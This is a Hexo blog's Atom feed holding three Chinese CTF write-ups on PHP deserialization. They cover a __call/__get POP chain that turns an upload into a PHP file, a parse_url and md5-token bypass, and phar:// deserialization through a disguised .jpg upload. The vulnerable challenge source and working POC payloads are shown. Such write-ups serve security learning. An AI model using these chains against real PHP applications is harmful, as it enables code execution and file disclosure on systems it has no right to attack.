<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>42&#39;s Blog</title>
  
  <subtitle>Do not go gentle into that good night. Old age should burn and rave at close of the day.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-06-06T09:58:49.489Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>42</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2019强网杯CTF</title>
    <link href="http://yoursite.com/2019/06/06/2019qiangwang/"/>
    <id>http://yoursite.com/2019/06/06/2019qiangwang/</id>
    <published>2019-06-06T09:45:26.790Z</published>
    <updated>2019-06-06T09:58:49.489Z</updated>
    
    <content type="html"><![CDATA[<p><strong><em>WEB-1 Upload（简化）</em></strong></p><a id="more"></a><p><em>index.php</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;re.php&apos;;</span><br><span class="line">class register </span><br><span class="line">&#123;</span><br><span class="line">    public $ff;</span><br><span class="line">         </span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        print(&apos;hahaha&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        print(&apos;hacked by jiahaoqiu&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function guapi()</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$this-&gt;ff)</span><br><span class="line">        &#123;</span><br><span class="line">             $this-&gt;ff-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">        #echo 123;</span><br><span class="line">        print(&apos;hacked by jiahaoqiu  12345&apos;);</span><br><span class="line">                if($this-&gt;ff)</span><br><span class="line">                &#123;</span><br><span class="line">               echo &apos;ssss&apos;;</span><br><span class="line">                       $this-&gt;ff-&gt;index();</span><br><span class="line">                &#125;</span><br><span class="line">         </span><br><span class="line">        &#125;</span><br><span class="line">     </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$fan = $_GET[&apos;a&apos;];</span><br><span class="line">unserialize(base64_decode($fan));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><hr><p><em>re.php</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class aa&#123;</span><br><span class="line">         </span><br><span class="line">        public $filename_tmp;</span><br><span class="line">        public $filename;</span><br><span class="line">        public $ext;</span><br><span class="line">        #public $img;</span><br><span class="line">        public $arr;</span><br><span class="line">    public function __construct() </span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;hackded by jiahaoqiu&quot;;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">         </span><br><span class="line">    public function upload()&#123;</span><br><span class="line">        if(!empty($_FILES))&#123;</span><br><span class="line">                $this-&gt;filename_tmp=$_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">                $this-&gt;filename=md5($_FILES[&apos;upload_file&apos;][&apos;name&apos;]).&quot;.png&quot;;</span><br><span class="line">                $this-&gt;ext_check();</span><br><span class="line">            &#125;</span><br><span class="line">            if($this-&gt;ext) &#123;</span><br><span class="line">                echo 3;</span><br><span class="line">                if(getimagesize($this-&gt;filename_tmp)) &#123;</span><br><span class="line">                    @copy($this-&gt;filename_tmp, $this-&gt;filename);</span><br><span class="line">                    @unlink($this-&gt;filename_tmp);</span><br><span class="line">                    #$this-&gt;img=&quot;$this-&gt;filename&quot;;</span><br><span class="line">                    #echo $thi-&gt;img;</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                echo &quot;error&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                    echo &quot;error&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    public function __get($name)&#123;</span><br><span class="line">        echo &apos;2&apos;;</span><br><span class="line">        return $this-&gt;arr[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($name, $arguments)&#123;</span><br><span class="line">        echo &apos;1&apos;;</span><br><span class="line">        if($this-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function hello()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;hacked by 1&quot;;</span><br><span class="line">        if($this-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">#$fan = new aa;</span><br><span class="line">#$fan-&gt;index();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><hr><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://wx4.sinaimg.cn/mw690/007b2muugy1g3rkxbk79hj30ez03c0ta.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>本题目的是将文件夹中的<code>2.png</code>文件改为<code>2.php</code>，审计源码index.php第17行发现<code>upload函数</code>中第二个分支语句可利用，只要控制<code>filename</code>与<code>filename_tmp</code>属性即可达到将2.png替换为2.php的目的，而要利用upload函数就需要进观察。</p><hr><br><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://wx1.sinaimg.cn/mw690/007b2muugy1g3rkxem04vj30bz04sq3f.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>做题时还是会最先考虑利用题目中很显眼的<code>__Call</code>与<code>__Get</code>两个魔术方法，发现<code>__Call函数</code>中：<br>其中<code>$arguments</code>便是函数形参，可以利用此行语句来执行<code>upload()</code>。想要利用<code>__Call函数</code>就需要调用该类中不存在的方法；并且，再调用<code>__Call函数</code>时，形参<code>$name</code>即为被调用的那个不存在的方法的名称；</p><p>而<strong>Get函数的利用需要调用该类中不存在的属性，此时再看</strong>Call函数中的<code>if($this-&gt;{$name})</code>，竟然用形参<code>$name</code> 这个该类中不存在的方法做判断条件，那么当调用这个与不存在的方法同名的属性时，__Get函数便会执行，从而进入 <code>return $this-&gt;arr[$name]</code>  语句，所以当我们控制arr数组中下标为<code>$name</code>的值时便可控制return的返回值，即将<code>$this-&gt;{$name}</code>变为我们指定的 arr[$name]的值，结合前面要利用upload函数，将arr[$name]的值变为upload，即可将<code>$this-&gt;{$this-&gt;{$name}}($arguments)</code><br>变为执行<code>$this-&gt;upload()</code>;</p><hr><br><p><img src="http://wx3.sinaimg.cn/mw690/007b2muugy1g3rkxggohuj30cc05oq37.jpg" alt></p><p>如上，开始构造完整的序列化攻击链，首先要调用upload函数就需要调用<strong>Call函数，发现可以利用<code>$this-&gt;ff-&gt;index()</code>，将register类中的ff属性赋为aa类，这样就能是aa类调用其不存在的方法“index（）”，从而调用</strong>Call函数，在执行<strong>Call函数时，其中的<code>if($this-&gt;{$name})</code>即变为<br><code>if($this-&gt;index)</code>，而aa类中又不存在index这个属性，所以会进而调用</strong>Get函数，我们再令<strong>Get函数中的arr[index]的值为upload，使</strong> Get函数最终将“upload“ return给<code>$this-&gt;{$name}</code>，便可通过<br><code>$this-&gt;{$this-&gt;{$name}}($arguments)</code>执行<code>$this-&gt;upload()</code>；</p><hr><br><p><strong><em>POC:</em></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">$a = new aa();</span><br><span class="line"> </span><br><span class="line">$reg = new register();</span><br><span class="line">$reg -&gt; ff = $a;</span><br><span class="line"> </span><br><span class="line">$a -&gt; arr = array(&apos;&apos;index =&gt; &apos;upload&apos;);</span><br><span class="line">$a -&gt; filename_tmp = &apos;2.png&apos;;</span><br><span class="line">$a -&gt; filename = &apos;2.php&apos;;</span><br><span class="line">$a -&gt; ext = &apos;1&apos;;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;&lt;em&gt;WEB-1 Upload（简化）&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
      <category term="PHP反序列化" scheme="http://yoursite.com/categories/CTF/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>2019国赛CTF</title>
    <link href="http://yoursite.com/2019/06/06/2019guosai/"/>
    <id>http://yoursite.com/2019/06/06/2019guosai/</id>
    <published>2019-06-06T09:12:23.164Z</published>
    <updated>2019-06-06T09:43:39.638Z</updated>
    
    <content type="html"><![CDATA[<p><strong>WEB-1 justSoso</strong></p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$payload = $_GET[&quot;payload&quot;];</span><br><span class="line">  </span><br><span class="line">if (!isset($file)) &#123;</span><br><span class="line">    echo &apos;Missing parameter&apos; . &apos;&lt;br&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">if (preg_match(&quot;/flag/&quot;, $file)) &#123;</span><br><span class="line">    die(&apos;hack attacked!!!&apos;);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">@include ($file);</span><br><span class="line">if (isset($payload)) &#123;</span><br><span class="line">    $url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]);</span><br><span class="line">    parse_str($url[&apos;query&apos;], $query);</span><br><span class="line">    foreach ($query as $value) &#123;</span><br><span class="line">        if (preg_match(&quot;/flag/&quot;, $value)) &#123;</span><br><span class="line">            die(&apos;stop hacking!&apos;);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload = unserialize($payload);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;Missing parameters&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><em>index.php</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Handle &#123;</span><br><span class="line">    private $handle;</span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        foreach (get_object_vars($this) as $k =&gt; $v) &#123;</span><br><span class="line">            $this-&gt;$k = null;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;Waking upn&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct($handle) &#123;</span><br><span class="line">        $this-&gt;handle = $handle;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $this-&gt;handle-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">class Flag &#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $token;</span><br><span class="line">    public $token_flag;</span><br><span class="line">    function __construct($file) &#123;</span><br><span class="line">        $this-&gt;file = $file;</span><br><span class="line">        $this-&gt;token_flag = $this-&gt;token = md5(rand(1, 10000));</span><br><span class="line">    &#125;</span><br><span class="line">    public function getFlag() &#123;</span><br><span class="line">        $this-&gt;token_flag = md5(rand(1, 10000));</span><br><span class="line">        if ($this-&gt;token === $this-&gt;token_flag) &#123;</span><br><span class="line">            if (isset($this-&gt;file)) &#123;</span><br><span class="line">                echo @highlight_file($this-&gt;file, true);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">a</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><em>hint.php</em></p><hr><p>这道题的重点不是其中的反序列化，而是其中<code>parse_url</code>与<code>md5</code>的绕过方法</p><hr><p>分析hint源码发现，我们需要将<code>Handle类</code>中的<code>handle属性</code>赋值为<code>Flag类</code>以调用<code>getFlag()</code>函数，<br>但单单这样构造序列化之后，传入的payload中肯定含有“flag”这一字符串，会因index.php源码中的遍历url而被匹配到，经过搜索发现，可以通过加两个双斜杠的方式绕过<code>parse_url</code>进而绕过正则匹配。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://wx2.sinaimg.cn/mw690/007b2muugy1g3rk245ri0j30hn00rmx9.jpg" alt="parse_url绕过" title>                </div>                <div class="image-caption">parse_url绕过</div>            </figure><hr><p>但<code>getFlag()</code>函数中还存在一个问题，虽然<code>Flag类</code>中前几条语句将<code>token属性</code>与<code>token_flag属性</code>相等，getFlag函数中，又将token_flag赋为了一个新的md5加密后的随机值，所以此处又需要绕过，爆破似乎可行，但经过搜索发现存在另一种较为简单的方法：<br>利用取地址符号“<code>&amp;</code>”，来使token与token_flag的关系始终相等，这样在给token_flag赋新值时，token也会跟着变化。</p><p><strong><em>POC:</em></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$b = new Flag(&quot;flag.php&quot;);</span><br><span class="line">$b-&gt;token = &amp;$b-&gt;token_flag;</span><br><span class="line">$a = new Handle($b);</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;WEB-1 justSoso&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
      <category term="PHP反序列化" scheme="http://yoursite.com/categories/CTF/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
      <category term="md5绕过" scheme="http://yoursite.com/tags/md5%E7%BB%95%E8%BF%87/"/>
    
      <category term="parse_url绕过" scheme="http://yoursite.com/tags/parse-url%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>团队省赛选拔题</title>
    <link href="http://yoursite.com/2019/06/06/tags_test/"/>
    <id>http://yoursite.com/2019/06/06/tags_test/</id>
    <published>2019-06-06T06:31:27.841Z</published>
    <updated>2019-06-06T09:44:40.487Z</updated>
    
    <content type="html"><![CDATA[<p><strong>phar反序列化</strong></p><a id="more"></a><p><strong>引入</strong></p><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include(&apos;flag.php&apos;);</span><br><span class="line">class hello</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $welcome;</span><br><span class="line"> </span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function simple_hello()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;welcome = &quot;hello &quot;.$this-&gt;name.&quot; welcome to ctf!&quot;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">        echo $this-&gt;welcome;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;simple_hello();</span><br><span class="line">                echo &apos;test&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class gogogo</span><br><span class="line">&#123;</span><br><span class="line">    public $one;</span><br><span class="line">    public $two;</span><br><span class="line"> </span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;one-&gt;get_flag();</span><br><span class="line">        return &apos;0&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class nice</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $flag;</span><br><span class="line"> </span><br><span class="line">    public function __construct($flag, $file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;flag = $flag;</span><br><span class="line">        $this-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function check()</span><br><span class="line">    &#123;</span><br><span class="line">        chdir(&apos;upload&apos;);</span><br><span class="line">        if(file_exists($this-&gt;file.&quot;.jpg&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">            echo &apos;file exist&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            echo &apos;file not exist&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">                public function get_flag()</span><br><span class="line">                &#123;</span><br><span class="line">                      echo $this-&gt;flag.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">&#125;</span><br><span class="line">@$a = $_GET[&apos;filename&apos;];</span><br><span class="line">$e = new nice($flag, $a);</span><br><span class="line">$e-&gt;check();</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><hr><p>刚刚拿到这道题的时候，发现存在多个PHP魔术方法，明显是反序列化；<br>但进一步审计发现并没有任何userialize的地方，经过搜索发现存在一种名为<code>phar反序列化</code>漏洞，即在不利用<code>unserialize()</code>函数的情况下，利用文件操作函数（<code>file_exits、is_dir等</code>）实现反序列化。</p><hr><br>首先分析一波phar文件的结构：phar本质上是一种压缩文件，其中`meta-data`部分需要被序列化之后存储，利用该漏洞的核心便是当文件操作函数结合`phar://伪协议`时会将phar文件中的`meta-data`部分反序列化，这时我们构造的序列化攻击链就会发挥作用其次，phar文件结构中还要添加被压缩的文件名（ex：test.jpg），之前由于一直未注意到这个问题导致题目卡了很长时间。。。。   <p><img src="http://wx2.sinaimg.cn/mw690/007b2muugy1g3rjk84c20j30j90650th.jpg" alt="phar文件结构"></p><hr><br>经过以上分析，我们可以写一个php文件（该文件中已将序列化构造链传到meta-data，本体攻击链构造较为简单，就不详述），访问该php文件会在目录下生成一个phar文件：<p><strong><em>POC</em></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">class hello</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $welcome;</span><br><span class="line">    </span><br><span class="line">    public function simple_hello()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;welcome = &quot;hello &quot;.$this-&gt;name.&quot; welcome to ctf!&quot;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">        echo $this-&gt;welcome;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;simple_hello();</span><br><span class="line">                echo &apos;test&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class gogogo</span><br><span class="line">&#123;</span><br><span class="line">    public $one;</span><br><span class="line">    public $two;</span><br><span class="line">     </span><br><span class="line"> </span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;one-&gt;get_flag();</span><br><span class="line">        return &apos;0&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class nice</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $flag; </span><br><span class="line"> </span><br><span class="line">    public function get_flag()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;flag.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$he = new hello();</span><br><span class="line">$he -&gt;name = new gogogo();</span><br><span class="line">$he -&gt;name -&gt; one = new nice();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">$phar = new Phar(&apos;phar.phar&apos;);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(&apos;&lt;?php __HALT_COMPILER();?&gt;&apos;);</span><br><span class="line">$phar -&gt; addFromString(&apos;test.txt&apos;,&apos;test&apos;);</span><br><span class="line">$phar -&gt; setMetadata($he);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><hr><br>生成`phar.phar`文件之后，将其后缀名改为.jpg直接上传，上传后在存在各种类源码的ctf.php页面传入fiename参数。（ex：`ctf.php?filename=phar://upload/phar.jpg`）本来以为这道题就这样了，flag就会出来了，但怎么尝试上传flag就是不会回显，心态也有点崩。。。后经大佬提示，源码中47行check()函数：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public function check()</span><br><span class="line">    &#123;</span><br><span class="line">        chdir(&apos;upload&apos;);</span><br><span class="line">        if(file_exists($this-&gt;file.&quot;.jpg&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">            echo &apos;file exist&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            echo &apos;file not exist&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现首先会将目录切换到upload并且会在file属性后拼接一个“<code>.jpg</code>“，这样的话，就需要将原来添加的压缩文件名“<code>test.txt</code>”改为“<code>test.jpg</code>”以配合拼接<br>最终PAYLOAD：<code>ctf.php?filename=phar://phar.jpg/test</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;phar反序列化&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
